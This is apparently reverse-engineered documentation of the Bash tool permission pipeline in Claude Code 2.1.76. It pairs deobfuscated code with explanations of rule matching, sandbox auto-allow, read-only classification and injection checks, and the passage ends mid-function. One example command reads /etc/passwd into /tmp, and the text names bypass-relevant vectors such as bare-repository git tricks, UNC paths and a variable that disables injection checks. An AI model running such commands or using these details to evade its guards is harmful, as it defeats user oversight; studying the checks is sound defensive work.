# Bash Tool Permission Pipeline (Claude Code 2.1.76)

> Complete permission flow for the Bash tool: tree-sitter AST parsing, sandbox determination, multi-layer rule matching, read-only classification, compound command analysis, and security validation.

---

## Related Symbols

> Symbol mappings:
> - J4 = BashTool definition (chunks.172.mjs:84)
> - Tn8 = checkBashPermissions (chunks.172.mjs:1930)
> - cr6 = checkPermissionRules (chunks.172.mjs:2273)
> - mfq = checkDenyRules (chunks.172.mjs:1880)
> - VYz = checkSandboxPermission (chunks.172.mjs:1808)
> - ufq = checkPrefixAndCompound (chunks.172.mjs:2316)
> - Z01 = checkReadOnlyBehavior (chunks.92.mjs:1685)
> - Ti = shouldUseSandbox (chunks.172.mjs:2454)
> - yYz = isExcludedCommand (chunks.172.mjs:2412)
> - SN6 = generateSuggestions (chunks.172.mjs:1607)
> - ow = formatDecisionMessage (chunks.172.mjs:2517)
> - Dfq = parseCommandAST (chunks.172.mjs:386)
> - vfq = checkPipelinePermission (chunks.172.mjs:1399)
> - j01 = checkRedirectsAndPaths (chunks.91.mjs:2904)
> - Vfq = checkModeSpecific (chunks.172.mjs:1461)
> - wz4 = checkSedSafety (chunks.91.mjs:2645)
> - EYz = checkDenyWithRedirects (chunks.172.mjs:1895)
> - CN6 = matchRulesAgainstCommand (chunks.172.mjs:1756) -- see [rule_matching.md](rule_matching.md)

---

## Architecture

```
Bash tool_use { command, dangerouslyDisableSandbox?, timeout? }
    |
    v
Tn8 (checkBashPermissions) --- Main 300-line permission gate
    |
    +-- Step 1: Parse command (tree-sitter AST via Dfq)
    |     +-- "simple" --> extract commands + redirects
    |     +-- "too-complex" --> mfq() deny check --> "ask"
    |     +-- "parse-unavailable" --> shell-quote fallback (Fz)
    |
    +-- Step 2: Sandbox auto-allow (if sandboxing enabled)
    |     +-- Ti() -> check sandbox eligibility
    |     +-- VYz() -> sandbox prefix-match with pipe splitting
    |
    +-- Step 3: Permission rules (exact match)
    |     +-- cr6() -> CN6("exact") -> deny/ask/allow/passthrough
    |
    +-- Step 4: Bash prompt rules (classifier-based, if enabled)
    |     +-- NN1() -> deny/ask classifiers with confidence check
    |
    +-- Step 5: Pipeline analysis
    |     +-- vfq() -> recursive pipe segment permission checking
    |
    +-- Step 6: Security checks (if parse unavailable)
    |     +-- dr6() -> command injection detection
    |
    +-- Step 7: Compound command analysis
    |     +-- kYz() -> filter cd subcommands
    |     +-- ufq() per subcommand -> exact+prefix+redirect+path+readOnly
    |
    +-- Step 8: Final assembly
          +-- Aggregate subcommand results
          +-- Sfq() -> extended check with injection detection
          +-- Generate suggestions for "ask" decisions
```

---

## Symbol 1: J4 -- BashTool Definition

**What it does:** The complete Bash tool definition object, wiring together schema validation, permission checking, rendering, and read-only classification.

```javascript
// ============================================
// BashTool definition (abbreviated)
// Location: chunks.172.mjs:84-160
// ============================================

// ORIGINAL (for source lookup):
J4 = {
    name: Q7,                          // "Bash"
    searchHint: "execute shell commands",
    maxResultSizeChars: 30000,
    strict: true,
    isReadOnly(A) {
        let q = vi6(A.command);        // hasCdSubcommand
        return Z01(A, q).behavior === "allow"
    },
    async checkPermissions(A, q) {
        return await Tn8(A, q)         // Main permission gate
    },
    // ... rendering, schema, etc.
}

// READABLE (for understanding):
BashTool = {
    name: "Bash",
    isReadOnly(input) {
        let hasCdSubcommand = hasCdSubcommand(input.command);
        return checkReadOnlyBehavior(input, hasCdSubcommand).behavior === "allow";
    },
    async checkPermissions(input, context) {
        return await checkBashPermissions(input, context);
    }
};

// Mapping: J4->BashTool, Q7->"Bash", vi6->hasCdSubcommand,
//   Z01->checkReadOnlyBehavior, Tn8->checkBashPermissions
```

**Key insight:** The `isReadOnly` check delegates to `Z01` and is used both for concurrency safety (read-only commands can run in parallel) and as a fallback permission gate in `ufq`.

---

## Symbol 2: Tn8 -- checkBashPermissions (Main Permission Gate)

**What it does:** The central 300-line function that determines whether a Bash command should be allowed, denied, or require user approval. This is the most complex permission function in the codebase.

### Section 1: Command Parsing (lines 1930-1971)

```javascript
// ============================================
// checkBashPermissions - Section 1: AST Parsing
// Location: chunks.172.mjs:1930-1971
// ============================================

// ORIGINAL (for source lookup):
async function Tn8(A, q, K = pr6) {
    let Y = q.getAppState(),
        _ = t6(process.env.CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK) ? {kind: "parse-unavailable"}
            : await Dfq(A.command),
        w = null, O, $;
    if (_.kind === "too-complex") {
        let B = mfq(A, Y.toolPermissionContext);
        if (B !== null) return B;
        let b = {type: "other", reason: _.reason};
        return d("tengu_bash_ast_too_complex", {nodeTypeId: Mfq(_.nodeType)}), {
            behavior: "ask", decisionReason: b, message: ow(J4.name, b), suggestions: []
        }
    }
    if (_.kind === "simple") {
        let B = ffq(_.commands);
        if (!B.ok) {
            let b = EYz(A, Y.toolPermissionContext, _.commands);
            if (b !== null) return b;
            return {behavior: "ask", decisionReason: {type: "other", reason: B.reason}, ...}
        }
        w = _.commands.map((b) => b.text), O = _.commands.flatMap((b) => b.redirects), $ = _.commands
    }
    if (_.kind === "parse-unavailable") {
        let B = Fz(A.command);
        if (!B.success) return {behavior: "ask", ...}
    }

// READABLE (for understanding):
async function checkBashPermissions(input, sessionContext, classifierFn = defaultClassifier) {
    let appState = sessionContext.getAppState();

    // --- Parse command with tree-sitter ---
    let parseResult = isInjectionCheckDisabled()
        ? { kind: "parse-unavailable" }
        : await parseCommandAST(input.command);

    let subcommands = null;       // string[] from AST
    let redirections, astCommands; // AST metadata

    // Case 1: Too complex for AST (control chars, Unicode, brace expansion)
    if (parseResult.kind === "too-complex") {
        // Check deny rules first (might already be blocked)
        let denyResult = checkDenyRules(input, appState.toolPermissionContext);
        if (denyResult !== null) return denyResult;
        // Otherwise require user approval
        return { behavior: "ask", reason: parseResult.reason };
    }

    // Case 2: Successfully parsed
    if (parseResult.kind === "simple") {
        let validation = validateASTCommands(parseResult.commands);
        if (!validation.ok) {
            // Validate against deny rules including redirect commands
            let denyResult = checkDenyWithRedirects(input, appState.toolPermissionContext, parseResult.commands);
            if (denyResult !== null) return denyResult;
            return { behavior: "ask", reason: validation.reason };
        }
        subcommands = parseResult.commands.map(c => c.text);
        redirections = parseResult.commands.flatMap(c => c.redirects);
        astCommands = parseResult.commands;
    }

    // Case 3: Tree-sitter unavailable
    if (parseResult.kind === "parse-unavailable") {
        let shellQuoteResult = shellQuoteParse(input.command);
        if (!shellQuoteResult.success) {
            return { behavior: "ask", reason: "Malformed syntax" };
        }
    }
}

// Mapping: Tn8->checkBashPermissions, A->input, q->sessionContext, K->classifierFn,
//   Y->appState, _->parseResult, w->subcommands, O->redirections, $->astCommands,
//   pr6->defaultClassifier, Dfq->parseCommandAST, mfq->checkDenyRules,
//   ffq->validateASTCommands, EYz->checkDenyWithRedirects, Fz->shellQuoteParse
```

### Section 2: Sandbox Auto-Allow (lines 1987-1989)

```javascript
// ============================================
// checkBashPermissions - Section 2: Sandbox
// Location: chunks.172.mjs:1987-1989
// ============================================

// ORIGINAL (for source lookup):
if (vA.isSandboxingEnabled() && vA.isAutoAllowBashIfSandboxedEnabled() && Ti(A)) {
    let B = VYz(A, Y.toolPermissionContext);
    if (B.behavior !== "passthrough") return B
}

// READABLE (for understanding):
// If sandboxing is active AND auto-allow is enabled AND this command will be sandboxed:
if (sandboxConfig.isSandboxingEnabled()
    && sandboxConfig.isAutoAllowBashIfSandboxedEnabled()
    && shouldUseSandbox(input)) {
    let sandboxResult = checkSandboxPermission(input, appState.toolPermissionContext);
    if (sandboxResult.behavior !== "passthrough") return sandboxResult;
    // "passthrough" means sandbox check was inconclusive, continue to other checks
}
```

### Section 3: Exact Permission Rules (line 1991)

```javascript
// ORIGINAL (for source lookup):
let H = cr6(A, Y.toolPermissionContext);
if (H.behavior === "deny") return H;

// READABLE:
let exactRulesResult = checkPermissionRules(input, appState.toolPermissionContext);
if (exactRulesResult.behavior === "deny") return exactRulesResult;
// Note: "ask" and "allow" from exact rules are NOT returned here --
// they are used later in the compound analysis
```

### Section 4: Bash Prompt Rules / Classifiers (lines 1993-2030)

```javascript
// ============================================
// checkBashPermissions - Section 4: Classifiers
// Location: chunks.172.mjs:1993-2030
// ============================================

// READABLE (for understanding):
// Only active when: feature flag T66() is on AND mode !== "auto"
if (isClassifierEnabled() && appState.mode !== "auto") {
    let denyClassifiers = getDenyClassifiers(appState.toolPermissionContext);
    let askClassifiers  = getAskClassifiers(appState.toolPermissionContext);

    if (denyClassifiers.length > 0 || askClassifiers.length > 0) {
        let [denyMatch, askMatch] = await Promise.all([
            denyClassifiers.length > 0
                ? runClassifier(input.command, cwd(), denyClassifiers, "deny", signal, isNonInteractive)
                : null,
            askClassifiers.length > 0
                ? runClassifier(input.command, cwd(), askClassifiers, "ask", signal, isNonInteractive)
                : null
        ]);

        if (denyMatch?.matches && denyMatch.confidence === "high") {
            return { behavior: "deny", message: `Denied by Bash prompt rule: "${denyMatch.matchedDescription}"` };
        }
        if (askMatch?.matches && askMatch.confidence === "high") {
            return { behavior: "ask", message: `Required by Bash prompt rule: "${askMatch.matchedDescription}"` };
        }
    }
}
```

### Section 5: Pipeline Analysis (lines 2032-2059)

```javascript
// ============================================
// checkBashPermissions - Section 5: Pipeline
// Location: chunks.172.mjs:2032-2059
// ============================================

// ORIGINAL (for source lookup):
let j = await vfq(A, (B) => Tn8(B, q, K), {
    isNormalizedCdCommand: Sn8,
    isNormalizedGitCommand: G01
});
if (j.behavior !== "passthrough") {
    if (j.behavior === "allow") {
        // Even if pipeline says allow, check injection for non-AST commands
        let B = w === null ? await dr6(A.command) : null;
        if (B !== null && B.behavior !== "passthrough" && B.behavior !== "allow") {
            return { behavior: "ask", reason: B.message };
        }
        // Check redirects and path safety
        let b = j01(A, G1(), Y.toolPermissionContext, vi6(A.command), O, $);
        if (b.behavior !== "passthrough") return b;
    }
    if (j.behavior === "ask") return j;
    return j;
}

// READABLE (for understanding):
let pipelineResult = await checkPipelinePermission(input, recursiveCheckFn, {
    isNormalizedCdCommand: isCdCommand,
    isNormalizedGitCommand: isGitCommand
});
if (pipelineResult.behavior !== "passthrough") {
    if (pipelineResult.behavior === "allow") {
        // Post-allow safety: injection + redirect + path checks
        if (subcommands === null) {  // No AST available
            let injectionResult = await checkCommandInjection(input.command);
            if (injectionResult is ask/deny) return ask;
        }
        let pathResult = checkRedirectsAndPaths(input, cwd(), permCtx, hasCd, redirections, astCommands);
        if (pathResult is not passthrough) return pathResult;
    }
    return pipelineResult;
}
```

### Section 6: Security Pattern Checks (lines 2061-2082)

```javascript
// ============================================
// checkBashPermissions - Section 6: Security
// Location: chunks.172.mjs:2061-2082
// ============================================

// ORIGINAL (for source lookup):
if (w === null && !t6(process.env.CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK)) {
    let B = await dr6(A.command);
    if (B.behavior === "ask" && B.isBashSecurityCheckForMisparsing) {
        let b = BY4(A.command),
            p = b !== null ? await dr6(b) : null;
        if (b === null || p?.behavior === "ask" && p.isBashSecurityCheckForMisparsing) {
            Y = q.getAppState();
            let Q = cr6(A, Y.toolPermissionContext);
            if (Q.behavior === "allow") return Q;
            return {behavior: "ask", reason: B.message};
        }
    }
}

// READABLE (for understanding):
// Only runs when tree-sitter AST is unavailable (subcommands === null)
if (subcommands === null && !isInjectionCheckDisabled()) {
    let securityResult = await checkCommandInjection(input.command);

    if (securityResult.behavior === "ask" && securityResult.isBashSecurityCheckForMisparsing) {
        // Double-check: normalize command and re-check
        let normalized = normalizeCommand(input.command);
        let normalizedResult = normalized !== null ? await checkCommandInjection(normalized) : null;

        // If both original and normalized flag security issues:
        if (normalized === null || normalizedResult?.isBashSecurityCheckForMisparsing) {
            // Last chance: check if exact rules allow it
            let exactResult = checkPermissionRules(input, appState.toolPermissionContext);
            if (exactResult.behavior === "allow") return exactResult;
            return { behavior: "ask", reason: securityResult.message };
        }
        // If normalized version is clean, fall through to compound analysis
    }
}
```

**Key insight:** The double-check pattern (original + normalized) reduces false positives. If the security checker flags a command but the normalized version is clean, it means the security concern was caused by quoting/escaping that does not survive normalization, so the command is likely safe.

### Section 7: Compound Command Analysis (lines 2084-2231)

```javascript
// ============================================
// checkBashPermissions - Section 7: Compound Analysis
// Location: chunks.172.mjs:2084-2231
// ============================================

// READABLE (for understanding):
let cwd = getCwd();
let normalizedCwd = isWindows() ? windowsNormalize(cwd) : cwd;

// Split command into subcommands (via AST or shell splitting)
let rawSubcommands = subcommands ?? splitSubcommands(input.command);
let { subcommands: filteredSubs, astCommandsByIdx } =
    filterCdSubcommands(rawSubcommands, astCommands, cwd, normalizedCwd);

// Guard: Too many subcommands (cap = 50)
if (subcommands === null && filteredSubs.length > 50) {
    return { behavior: "ask", reason: "Too many subcommands to safety-check" };
}

// Guard: Multiple cd commands
let cdCommands = filteredSubs.filter(s => isCdCommand(s));
if (cdCommands.length > 1) {
    return { behavior: "ask", reason: "Multiple directory changes require approval" };
}
let hasCd = cdCommands.length > 0;

// Guard: cd + git compound (bare repository attack prevention)
if (hasCd && filteredSubs.some(s => isGitCommand(s.trim()))) {
    return { behavior: "ask", reason: "cd + git compounds require approval" };
}

// Check each subcommand individually via ufq (checkPrefixAndCompound)
let subResults = filteredSubs.map((sub, idx) =>
    checkPrefixAndCompound({ command: sub }, permCtx, hasCd, astCommandsByIdx[idx])
);

// Deny wins immediately
if (subResults.some(r => r.behavior === "deny")) return { behavior: "deny" };

// Check redirects and paths
let pathResult = checkRedirectsAndPaths(input, cwd, permCtx, hasCd, redirections, astCommands);
if (pathResult.behavior === "deny") return pathResult;

// If all subcommands allowed AND no injection issues: allow
let hasInjection = false;
if (subcommands === null && !isInjectionCheckDisabled()) {
    hasInjection = (await Promise.all(
        filteredSubs.map(sub => checkCommandInjection(sub))
    )).some(r => r.behavior !== "passthrough");
}

if (subResults.every(r => r.behavior === "allow") && !hasInjection) {
    return { behavior: "allow", updatedInput: input };
}

// For remaining cases: run extended check (Sfq) with classifier
// Single subcommand:
if (filteredSubs.length === 1) {
    return await extendedCheck({ command: filteredSubs[0] }, permCtx, classifierResult, hasCd, hasAST);
}
// Multiple subcommands:
for (let sub of filteredSubs) {
    results.set(sub, await extendedCheck({ command: sub }, permCtx, ...));
}
if (all results are allow) return allow;
// Otherwise: collect suggestions from non-allowed subcommands, return ask
```

---

## Symbol 3: cr6 -- checkPermissionRules

**What it does:** First-pass permission check using exact rule matching. Returns deny/ask/allow/passthrough based on the first matching rule in each category.

```javascript
// ============================================
// checkPermissionRules
// Location: chunks.172.mjs:2273-2314
// ============================================

// ORIGINAL (for source lookup):
cr6 = (A, q) => {
    let K = A.command.trim(),
        {matchingDenyRules: Y, matchingAskRules: z, matchingAllowRules: _} = CN6(A, q, "exact");
    if (Y[0] !== void 0) return {behavior: "deny", message: `Permission to use ${J4.name} with command ${K} has been denied.`, decisionReason: {type: "rule", rule: Y[0]}};
    if (z[0] !== void 0) return {behavior: "ask", message: ow(J4.name), decisionReason: {type: "rule", rule: z[0]}};
    if (_[0] !== void 0) return {behavior: "allow", updatedInput: A, decisionReason: {type: "rule", rule: _[0]}};
    let w = {type: "other", reason: "This command requires approval"};
    return {behavior: "passthrough", message: ow(J4.name, w), decisionReason: w, suggestions: SN6(K)}
}

// READABLE (for understanding):
function checkPermissionRules(input, permissionContext) {
    let command = input.command.trim();

    // Match rules using EXACT mode
    let { matchingDenyRules, matchingAskRules, matchingAllowRules } =
        matchRulesAgainstCommand(input, permissionContext, "exact");

    // Priority: Deny > Ask > Allow > Passthrough
    if (matchingDenyRules[0] !== undefined) {
        return { behavior: "deny", rule: matchingDenyRules[0] };
    }
    if (matchingAskRules[0] !== undefined) {
        return { behavior: "ask", rule: matchingAskRules[0] };
    }
    if (matchingAllowRules[0] !== undefined) {
        return { behavior: "allow", updatedInput: input, rule: matchingAllowRules[0] };
    }

    // No rules matched
    return { behavior: "passthrough", suggestions: generateSuggestions(command) };
}

// Mapping: cr6->checkPermissionRules, A->input, q->permissionContext,
//   K->command, Y->matchingDenyRules, z->matchingAskRules, _->matchingAllowRules,
//   CN6->matchRulesAgainstCommand, ow->formatDecisionMessage, SN6->generateSuggestions
```

**Key insight:** The priority order is absolute: Deny > Ask > Allow. If a command matches both a deny rule and an allow rule, it is denied. The `"passthrough"` behavior means no rules matched, so the command continues through the pipeline to other checks.

---

## Symbol 4: mfq -- checkDenyRules

**What it does:** Two-phase deny check: first exact match, then prefix match. Used as a quick escape hatch for "too-complex" commands that cannot be fully analyzed.

```javascript
// ============================================
// checkDenyRules
// Location: chunks.172.mjs:1880-1892
// ============================================

// ORIGINAL (for source lookup):
function mfq(A, q) {
    let K = cr6(A, q);
    if (K.behavior !== "passthrough") return K;
    let Y = CN6(A, q, "prefix").matchingDenyRules[0];
    if (Y !== void 0) return {
        behavior: "deny",
        message: `Permission to use ${J4.name} with command ${A.command} has been denied.`,
        decisionReason: {type: "rule", rule: Y}
    };
    return null
}

// READABLE (for understanding):
function checkDenyRules(input, permissionContext) {
    // Phase 1: Full exact-match check (deny/ask/allow)
    let exactResult = checkPermissionRules(input, permissionContext);
    if (exactResult.behavior !== "passthrough") return exactResult;

    // Phase 2: Prefix-match for deny rules only
    let prefixDeny = matchRulesAgainstCommand(input, permissionContext, "prefix").matchingDenyRules[0];
    if (prefixDeny !== undefined) {
        return { behavior: "deny", rule: prefixDeny };
    }

    return null;  // No deny/ask/allow rules matched
}

// Mapping: mfq->checkDenyRules, A->input, q->permissionContext,
//   K->exactResult, Y->prefixDeny, cr6->checkPermissionRules, CN6->matchRulesAgainstCommand
```

**Key insight:** Returns `null` (not passthrough) when no rules match, indicating the caller should apply its own fallback logic (typically "ask").

---

## Symbol 5: VYz -- checkSandboxPermission

**What it does:** Permission check specifically for sandboxed commands. Uses prefix matching and handles compound commands by splitting them into pipe segments.

```javascript
// ============================================
// checkSandboxPermission
// Location: chunks.172.mjs:1808-1863
// ============================================

// ORIGINAL (for source lookup):
function VYz(A, q) {
    let K = A.command.trim(),
        {matchingDenyRules: Y, matchingAskRules: z} = CN6(A, q, "prefix");
    if (Y[0] !== void 0) return {behavior: "deny", ...};
    let _ = th1(K);
    if (_.length > 1) {
        let w;
        for (let O of _) {
            let $ = CN6({command: O}, q, "prefix");
            if ($.matchingDenyRules[0] !== void 0) return {behavior: "deny", ...};
            w ??= $.matchingAskRules[0]
        }
        if (w) return {behavior: "ask", rule: w}
    }
    if (z[0] !== void 0) return {behavior: "ask", ...};
    return {behavior: "allow", reason: "Auto-allowed with sandbox (autoAllowBashIfSandboxed enabled)"}
}

// READABLE (for understanding):
function checkSandboxPermission(input, permissionContext) {
    let command = input.command.trim();

    // 1. Prefix-match whole command against deny/ask rules
    let { matchingDenyRules, matchingAskRules } =
        matchRulesAgainstCommand(input, permissionContext, "prefix");

    if (matchingDenyRules[0] !== undefined) return { behavior: "deny" };

    // 2. For compound commands, check each subcommand individually
    let subcommands = splitSubcommands(command);
    if (subcommands.length > 1) {
        let firstAskRule = undefined;
        for (let sub of subcommands) {
            let subResult = matchRulesAgainstCommand({ command: sub }, permissionContext, "prefix");
            // Deny any subcommand -> deny whole command
            if (subResult.matchingDenyRules[0] !== undefined) return { behavior: "deny" };
            // Remember first ask rule (for reporting)
            firstAskRule ??= subResult.matchingAskRules[0];
        }
        // If any subcommand triggered ask, ask for whole command
        if (firstAskRule) return { behavior: "ask", rule: firstAskRule };
    }

    // 3. Check whole-command ask rules
    if (matchingAskRules[0] !== undefined) return { behavior: "ask" };

    // 4. Default: allow (sandboxed commands are safe)
    return {
        behavior: "allow",
        updatedInput: input,
        decisionReason: { type: "other", reason: "Auto-allowed with sandbox (autoAllowBashIfSandboxed enabled)" }
    };
}

// Mapping: VYz->checkSandboxPermission, A->input, q->permissionContext,
//   K->command, Y->matchingDenyRules, z->matchingAskRules, _->subcommands,
//   w->firstAskRule, th1->splitSubcommands, CN6->matchRulesAgainstCommand
```

**Key insight:** The default is ALLOW. Unlike the main permission pipeline where unrecognized commands are "ask", sandboxed commands default to allowed because they run inside a sandbox. The deny/ask rules act as override exceptions for commands that should not run even in a sandbox.

---

## Symbol 6: ufq -- checkPrefixAndCompound

**What it does:** Extended permission check that layers exact, prefix, redirect/path, mode-specific, and read-only checks in a cascading waterfall.

```javascript
// ============================================
// checkPrefixAndCompound
// Location: chunks.172.mjs:2316-2376
// ============================================

// ORIGINAL (for source lookup):
ufq = (A, q, K, Y) => {
    let z = A.command.trim(),
        _ = cr6(A, q);
    if (_.behavior === "deny" || _.behavior === "ask") return _;
    let {matchingDenyRules: w, matchingAskRules: O, matchingAllowRules: $} =
        CN6(A, q, "prefix", {skipCompoundCheck: Y !== void 0});
    if (w[0] !== void 0) return {behavior: "deny", ...};
    if (O[0] !== void 0) return {behavior: "ask", ...};
    let H = j01(A, G1(), q, K, Y?.redirects, Y ? [Y] : void 0);
    if (H.behavior !== "passthrough") return H;
    if (_.behavior === "allow") return _;
    if ($[0] !== void 0) return {behavior: "allow", rule: $[0]};
    let j = wz4(A, q);
    if (j.behavior !== "passthrough") return j;
    let J = Vfq(A, q);
    if (J.behavior !== "passthrough") return J;
    if (J4.isReadOnly(A)) return {behavior: "allow", reason: "Read-only command is allowed"};
    return {behavior: "passthrough", suggestions: SN6(z)}
}

// READABLE (for understanding):
function checkPrefixAndCompound(input, permContext, hasCdSubcommand, astCommand) {
    let command = input.command.trim();

    // Layer 1: Exact rules (deny/ask take priority)
    let exactResult = checkPermissionRules(input, permContext);
    if (exactResult.behavior === "deny" || exactResult.behavior === "ask") return exactResult;

    // Layer 2: Prefix rules
    let { matchingDenyRules, matchingAskRules, matchingAllowRules } =
        matchRulesAgainstCommand(input, permContext, "prefix", {
            skipCompoundCheck: astCommand !== undefined  // AST already validated
        });
    if (matchingDenyRules[0]) return { behavior: "deny" };
    if (matchingAskRules[0]) return { behavior: "ask" };

    // Layer 3: Redirect and path safety checks
    let pathResult = checkRedirectsAndPaths(input, cwd(), permContext, hasCdSubcommand,
        astCommand?.redirects, astCommand ? [astCommand] : undefined);
    if (pathResult.behavior !== "passthrough") return pathResult;

    // Layer 4: Exact allow (deferred after redirect checks!)
    if (exactResult.behavior === "allow") return exactResult;

    // Layer 5: Prefix allow
    if (matchingAllowRules[0]) return { behavior: "allow", rule: matchingAllowRules[0] };

    // Layer 6: Sed safety check
    let sedResult = checkSedSafety(input, permContext);
    if (sedResult.behavior !== "passthrough") return sedResult;

    // Layer 7: Mode-specific check (acceptEdits mode)
    let modeResult = checkModeSpecific(input, permContext);
    if (modeResult.behavior !== "passthrough") return modeResult;

    // Layer 8: Read-only fallback
    if (BashTool.isReadOnly(input)) {
        return { behavior: "allow", reason: "Read-only command is allowed" };
    }

    // Default: passthrough (needs user approval)
    return { behavior: "passthrough", suggestions: generateSuggestions(command) };
}

// Mapping: ufq->checkPrefixAndCompound, A->input, q->permContext, K->hasCdSubcommand,
//   Y->astCommand, z->command, _->exactResult, w->matchingDenyRules, O->matchingAskRules,
//   $->matchingAllowRules, H->pathResult, j->sedResult, J->modeResult,
//   cr6->checkPermissionRules, CN6->matchRulesAgainstCommand, j01->checkRedirectsAndPaths,
//   wz4->checkSedSafety, Vfq->checkModeSpecific, SN6->generateSuggestions
```

### Layer Priority Diagram

```
                      ufq checkPrefixAndCompound
                      ===========================

Input: "git push" with rule Bash(git:*) in allow

Layer 1: Exact deny/ask?      --> NO (not exact match for "git push")
Layer 2: Prefix deny/ask?     --> NO
Layer 3: Redirect/path safe?  --> passthrough (no redirects)
Layer 4: Exact allow?         --> NO (exact didn't match)
Layer 5: Prefix allow?        --> YES: Bash(git:*) matches "git push"
                                   RETURN: allow

Note: Layer 4 (exact allow) comes AFTER Layer 3 (redirect safety).
This means even if you have an exact allow rule like Bash(cat /etc/passwd > /tmp/x),
the redirect check can still block it. Deliberate security design.
```

**Key insight:** The ordering is carefully designed. Redirect and path safety checks (Layer 3) run BEFORE allow rules are honored (Layers 4-5). This means a command cannot bypass redirect safety checks even with an explicit allow rule. The read-only fallback (Layer 8) is the last resort, allowing commands like `ls`, `cat`, `grep` without any rules.

---

## Symbol 7: Z01 -- checkReadOnlyBehavior

**What it does:** 8-step classification that determines whether a command is read-only (safe to auto-allow).

```javascript
// ============================================
// checkReadOnlyBehavior
// Location: chunks.92.mjs:1685-1729
// ============================================

// ORIGINAL (for source lookup):
function Z01(A, q) {
    let {command: K} = A;
    if (!Fz(K, (w) => `$${w}`).success) return {behavior: "passthrough", message: "Command cannot be parsed"};
    if (Rp6(K).behavior !== "passthrough") return {behavior: "passthrough", message: "Command is not read-only"};
    if (r36(K)) return {behavior: "ask", message: "Windows UNC path"};
    let z = cg9(K);
    if (q && z) return {behavior: "passthrough", message: "cd + git compound"};
    if (z && lg9()) return {behavior: "passthrough", message: "Git bare repository"};
    if (z && og9(K)) return {behavior: "passthrough", message: "Git internal file creation"};
    if (z && vA.isSandboxingEnabled() && G1() !== AA()) return {behavior: "passthrough", message: "Git outside CWD"};
    if (EO(K).every((w) => {
            if (Rp6(w).behavior !== "passthrough") return !1;
            return dg9(w)
        })) return {behavior: "allow", updatedInput: A};
    return {behavior: "passthrough", message: "Command is not read-only"}
}

// READABLE (for understanding):
function checkReadOnlyBehavior(input, hasCdSubcommand) {
    let { command } = input;

    // Step 1: Parse check - command must be parseable
    if (!shellQuoteParse(command).success) {
        return { behavior: "passthrough" };  // Cannot determine, continue checks
    }

    // Step 2: Security pattern check (control chars, injection patterns)
    if (securityPatternCheck(command).behavior !== "passthrough") {
        return { behavior: "passthrough" };  // Suspicious, not read-only
    }

    // Step 3: Windows UNC path check (WebDAV attack vector)
    if (isWindowsUncPath(command)) {
        return { behavior: "ask" };  // Actively block
    }

    // Step 4: cd + git compound check
    let hasGitSubcommand = hasGitSubcommand(command);
    if (hasCdSubcommand && hasGitSubcommand) {
        return { behavior: "passthrough" };  // Bare repo attack risk
    }

    // Step 5: Git bare repository check
    if (hasGitSubcommand && isBareRepository()) {
        return { behavior: "passthrough" };  // Bare repo attack risk
    }

    // Step 6: Git internal file creation check
    if (hasGitSubcommand && createsGitInternalFiles(command)) {
        return { behavior: "passthrough" };  // Could create malicious hooks
    }

    // Step 7: Git outside CWD check (with sandbox)
    if (hasGitSubcommand && sandboxEnabled && cwd() !== originalCwd()) {
        return { behavior: "passthrough" };  // Git in untrusted directory
    }

    // Step 8: All pipe segments must be read-only
    if (splitSubcommands(command).every(sub => {
        if (securityPatternCheck(sub).behavior !== "passthrough") return false;
        return isReadOnlyCommand(sub);  // dg9
    })) {
        return { behavior: "allow", updatedInput: input };
    }

    return { behavior: "passthrough" };
}

// Mapping: Z01->checkReadOnlyBehavior, A->input, q->hasCdSubcommand,
//   K->command, z->hasGitSubcommand, Fz->shellQuoteParse, Rp6->securityPatternCheck,
//   r36->isWindowsUncPath, cg9->hasGitSubcommand, lg9->isBareRepository,
//   og9->createsGitInternalFiles, EO->splitSubcommands, dg9->isReadOnlyCommand,
//   vA->sandboxConfig, G1->cwd, AA->originalCwd
```

### Read-Only Decision Flow

```
Command: "git log --oneline | head -5"

Step 1: Parse check              --> success
Step 2: Security patterns         --> passthrough (no control chars)
Step 3: Windows UNC               --> false (not Windows)
Step 4: cd + git?                 --> false (no cd)
Step 5: Bare repository?          --> false (normal repo)
Step 6: Git internal files?       --> false (no file creation)
Step 7: Git outside CWD?          --> false (same CWD)
Step 8: All segments read-only?
    Segment "git log --oneline"   --> matches read-only pattern (git log)
    Segment "head -5"             --> matches read-only utility
    All pass --> ALLOW
```

### dg9 (isReadOnlyCommand) Recognition

The `dg9` function uses:
1. `gg9`: Tokenizes with shell-quote and matches against a table of known read-only command prefixes (from `mg9()`)
2. `Qg9`: Array of regex patterns for read-only commands
3. Exclusions: git with `-c`, `--exec-path`, or `--config-env` flags (can execute arbitrary code)
4. `Ug9`: Rejects commands with shell expansions (`$VAR`, globs `*`, `?`, `[...]`) since those could expand to dangerous values

---

## Symbol 8: Ti -- shouldUseSandbox

**What it does:** Determines whether a specific command will actually be sandboxed.

```javascript
// ============================================
// shouldUseSandbox
// Location: chunks.172.mjs:2454-2460
// ============================================

// ORIGINAL (for source lookup):
function Ti(A) {
    if (!vA.isSandboxingEnabled()) return !1;
    if (A.dangerouslyDisableSandbox && vA.areUnsandboxedCommandsAllowed()) return !1;
    if (!A.command) return !1;
    if (yYz(A.command)) return !1;
    return !0
}

// READABLE (for understanding):
function shouldUseSandbox(input) {
    // 1. Is sandboxing even enabled globally?
    if (!sandboxConfig.isSandboxingEnabled()) return false;

    // 2. Is the tool explicitly opting out AND is that allowed?
    if (input.dangerouslyDisableSandbox && sandboxConfig.areUnsandboxedCommandsAllowed()) return false;

    // 3. Must have a command
    if (!input.command) return false;

    // 4. Is the command in the excluded list?
    if (isExcludedCommand(input.command)) return false;

    return true;
}

// Mapping: Ti->shouldUseSandbox, A->input, vA->sandboxConfig, yYz->isExcludedCommand
```

---

## Symbol 9: yYz -- isExcludedCommand

**What it does:** Checks whether a command matches any of the configured sandbox exclusion patterns. Handles compound commands by checking each subcommand independently.

```javascript
// ============================================
// isExcludedCommand
// Location: chunks.172.mjs:2412-2451
// ============================================

// ORIGINAL (for source lookup):
function yYz(A) {
    let K = PA().sandbox?.excludedCommands ?? [];
    if (K.length === 0) return !1;
    let Y;
    try { Y = EO(A) } catch { Y = [A] }
    for (let z of Y) {
        let w = [z.trim()], O = new Set(w), $ = 0;
        while ($ < w.length) {
            let H = w.length;
            for (let j = $; j < H; j++) {
                let J = w[j],
                    M = bn8(J, xfq), D = Ac(J);
                if (!O.has(M)) w.push(M), O.add(M);
                if (!O.has(D)) w.push(D), O.add(D)
            }
            $ = H
        }
        for (let H of K) {
            let j = In8(H);
            for (let J of w) switch (j.type) {
